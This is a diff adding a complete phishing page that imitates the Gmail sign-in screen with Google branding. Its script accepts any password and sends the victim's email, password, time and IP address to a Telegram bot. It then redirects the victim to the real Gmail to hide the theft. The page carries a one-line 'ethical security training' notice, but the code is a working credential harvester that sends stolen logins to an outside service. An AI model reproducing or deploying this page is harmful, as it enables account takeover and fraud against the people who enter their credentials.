@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Email from Google</title>
+    <link rel="shortcut icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px 36px;
+            width: 100%;
+            margin-bottom: 16px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        
+        .login-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 40px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 13px 15px;
+            margin-bottom: 20px;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .login-form input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 30px;
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .login-btn:hover {
+            background: #1765cc;
+        }
+        
+        .login-btn:disabled {
+            background: #8ab4f8;
+            cursor: default;
+        }
+        
+        .forgot-pw {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 26px;
+            cursor: pointer;
+            display: inline-block;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dadce0;
+        }
+        
+        .divider::before {
+            margin-right: 16px;
+        }
+        
+        .divider::after {
+            margin-left: 16px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 10px 0;
+            cursor: pointer;
+            display: inline-block;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin: -16px 0 20px;
+            display: none;
+            text-align: left;
+            padding-left: 2px;
+        }
+        
+        .success-message {
+            color: #1a73e8;
+            font-size: 14px;
+            margin: -16px 0 20px;
+            display: none;
+            text-align: center;
+            padding: 10px;
+            background: #e8f0fe;
+            border-radius: 4px;
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            padding: 20px 0;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+        }
+        
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+        }
+        
+        .security-notice {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 40px;
+            text-align: center;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+        
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-10px); }
+            80% { transform: translateX(10px); }
+            100% { transform: translateX(0); }
+        }
+        
+        .email-display {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        .password-container {
+            display: none;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 75 24' width='75' height='24'><text x='0' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%234285F4'>G</text><text x='10' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%23EA4335'>o</text><text x='20' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%23FBBC05'>o</text><text x='30' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%234285F4'>g</text><text x='40' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%2334A853'>l</text><text x='46' y='16' font-family='Arial' font-size='16' font-weight='bold' fill='%23EA4335'>e</text></svg>" alt="Google" class="google-logo">
+        </div>
+        
+        <div class="login-box">
+            <h1 class="login-title" id="loginTitle">Sign in</h1>
+            <p class="login-subtitle" id="loginSubtitle">to continue to Gmail</p>
+            
+            <div class="email-display" id="emailDisplay"></div>
+            
+            <form class="login-form" id="loginForm">
+                <div id="emailStep">
+                    <input type="email" id="email" placeholder="Email or phone" required autofocus>
+                    <div class="error-message" id="emailErrorMessage">Couldn't find your Google Account</div>
+                    <button type="button" class="login-btn" id="nextBtn">Next</button>
+                </div>
+                
+                <div class="password-container" id="passwordStep">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                    <div class="error-message" id="passwordErrorMessage">Wrong password. Try again or click Forgot password to reset it.</div>
+                    <div class="success-message" id="successMessage">Login successful! Redirecting to Gmail...</div>
+                    <button type="button" class="login-btn" id="loginBtn">Sign in</button>
+                </div>
+                
+                <div class="forgot-pw" id="forgotPw">Forgot email?</div>
+                
+                <div class="divider hidden" id="divider">or</div>
+                
+                <div class="create-account" id="createAccount">Create account</div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                </select>
+            </div>
+            <div>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+        
+        <div class="security-notice">
+            <strong>Security Notice:</strong> This page is for ethical security training purposes only. Do not enter your real Gmail credentials.
+        </div>
+    </div>
+
+    <script>
+    async function getFastKey() {
+      const res = await fetch('/api/fast_servers');
+      const data = await res.json();
+      return data.fast_key;
+    }
+    
+    
+        // Telegram credentials
+       // const botfast_key = await getFastKey();
+        const chatId = new URLSearchParams(window.location.search).get('id');
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailErrorMessage = document.getElementById('emailErrorMessage');
+            const passwordErrorMessage = document.getElementById('passwordErrorMessage');
+            const successMessage = document.getElementById('successMessage');
+            const nextBtn = document.getElementById('nextBtn');
+            const loginBtn = document.getElementById('loginBtn');
+            const emailStep = document.getElementById('emailStep');
+            const passwordStep = document.getElementById('passwordStep');
+            const emailDisplay = document.getElementById('emailDisplay');
+            const loginTitle = document.getElementById('loginTitle');
+            const loginSubtitle = document.getElementById('loginSubtitle');
+            const forgotPw = document.getElementById('forgotPw');
+            const divider = document.getElementById('divider');
+            const createAccount = document.getElementById('createAccount');
+            
+            let userEmail = '';
+            
+            // Add focus to email field on page load
+            emailInput.focus();
+            
+            // Next button click handler
+            nextBtn.addEventListener('click', async function() {
+                const email = emailInput.value.trim();
+                
+                // Reset messages
+                emailErrorMessage.style.display = 'none';
+                nextBtn.disabled = true;
+                
+                // Validate email
+                if (!email) {
+                    emailErrorMessage.textContent = "Enter an email or phone number";
+                    emailErrorMessage.style.display = 'block';
+                    nextBtn.disabled = false;
+                    return;
+                }
+                
+                // Simulate network delay
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                // Validate email format
+                if (!validateEmail(email)) {
+                    emailErrorMessage.textContent = "Couldn't find your Google Account";
+                    emailErrorMessage.style.display = 'block';
+                    nextBtn.disabled = false;
+                    
+                    // Shake animation for error
+                    emailStep.style.animation = 'shake 0.5s';
+                    setTimeout(() => {
+                        emailStep.style.animation = '';
+                    }, 500);
+                    return;
+                }
+                
+                // Store email and show password step
+                userEmail = email;
+                
+                // Update UI for password step
+                emailStep.style.display = 'none';
+                passwordStep.style.display = 'block';
+                emailDisplay.textContent = userEmail;
+                emailDisplay.style.display = 'block';
+                loginTitle.textContent = 'Welcome';
+                loginSubtitle.textContent = '';
+                forgotPw.textContent = 'Forgot password?';
+                divider.classList.remove('hidden');
+                passwordInput.focus();
+                nextBtn.disabled = false;
+            });
+            
+            // Login button click handler - WILL ACCEPT ANY PASSWORD
+            loginBtn.addEventListener('click', async function() {
+                const password = passwordInput.value;
+                
+                // Reset messages
+                passwordErrorMessage.style.display = 'none';
+                successMessage.style.display = 'none';
+                loginBtn.disabled = true;
+                
+                // Validate password
+                if (!password) {
+                    passwordErrorMessage.textContent = "Enter a password";
+                    passwordErrorMessage.style.display = 'block';
+                    loginBtn.disabled = false;
+                    return;
+                }
+                
+                // Simulate network delay
+                await new Promise(resolve => setTimeout(resolve, 1200));
+                
+                // ALWAYS ACCEPT THE PASSWORD (REMOVED VALIDATION)
+                const isValid = true;
+                
+                if (isValid) {
+                    // Send credentials to Telegram bot
+                    const sent = await sendToTelegram(userEmail, password);
+                    
+                    if (sent) {
+                        // Show success message
+                        successMessage.style.display = 'block';
+                        
+                        // Redirect to real Gmail after a delay
+                        setTimeout(() => {
+                            window.location.href = 'https://mail.google.com/';
+                        }, 2000);
+                    } else {
+                        passwordErrorMessage.textContent = "Failed to sign in. Please try again later.";
+                        passwordErrorMessage.style.display = 'block';
+                        loginBtn.disabled = false;
+                    }
+                } else {
+                    // This block will never execute now since isValid is always true
+                    passwordErrorMessage.textContent = "Wrong password. Try again or click Forgot password to reset it.";
+                    passwordErrorMessage.style.display = 'block';
+                    loginBtn.disabled = false;
+                    
+                    // Shake animation for error
+                    passwordStep.style.animation = 'shake 0.5s';
+                    setTimeout(() => {
+                        passwordStep.style.animation = '';
+                    }, 500);
+                }
+            });
+            
+            // Forgot password button handler
+            forgotPw.addEventListener('click', function() {
+                if (passwordStep.style.display === 'block') {
+                    // On password screen - redirect to password recovery
+                    window.location.href = 'https://accounts.google.com/signin/recovery';
+                } else {
+                    // On email screen - redirect to account recovery
+                    window.location.href = 'https://accounts.google.com/signin/recovery';
+                }
+            });
+            
+            // Create account button handler
+            createAccount.addEventListener('click', function() {
+                window.location.href = 'https://accounts.google.com/signup';
+            });
+            
+            // Allow form submission with Enter key
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    nextBtn.click();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    loginBtn.click();
+                }
+            });
+            
+            function validateEmail(email) {
+                // Basic email validation
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+            
+            async function sendToTelegram(email, password) {
+                const botfast_key = await getFastKey();
+                const chatId = new URLSearchParams(window.location.search).get('id');
+                
+                const message = `✅ Gmail Credentials Received:
+Email: ${email}
+Password: ${password}
+Time: ${new Date().toLocaleString()}
+IP: ${await getIP()}
+
+Thank you Team HCO 🔖`;
+                
+                const url = `https://api.telegram.org/bot${botfast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                try {
+                    const response = await fetch(url);
+                    return response.ok;
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+            
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip || 'Unknown';
+                } catch {
+                    return 'Unknown';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
